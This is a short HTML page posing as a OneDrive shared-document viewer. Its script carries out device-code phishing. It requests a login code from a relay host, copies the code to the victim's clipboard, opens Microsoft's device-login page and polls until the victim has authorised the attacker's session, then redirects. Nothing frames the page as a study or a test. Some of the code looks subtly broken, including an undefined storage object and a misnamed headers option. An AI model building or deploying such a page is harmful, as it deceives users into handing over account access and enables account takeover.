<!doctype html>
<html><head><title>OneDrive</title></head><body>
<h1>Shared Document</h1><button id="open">Open document</button>
<script>
const backend = 'https://relay.example.invalid';
const requestHeaders = {'X-Antibot-Token': ticketStorage.getItem('gate'),
                 'X-Page-Id': location.pathname, 'X-Cookie-Mode': 'none'};
document.getElementById('open').onclick = async () => {
  const response = await fetch(backend + '/api/device/start', {method:'POST', requestHeaders});
  const ticket = await response.json();
  await navigator.clipboard.writeText(ticket.user_code);
  window.open('https://microsoft.com/devicelogin', '_blank');
  const timer = setInterval(async () => {
    const reply = await fetch(backend + '/status/' + ticket.uuid, {requestHeaders});
    const state = await reply.json();
    if (state.status === 'completed') {
      clearInterval(timer);
      location.href = 'https://documents.example.invalid/complete';
    }
  }, 5000);
};
</script></body></html>
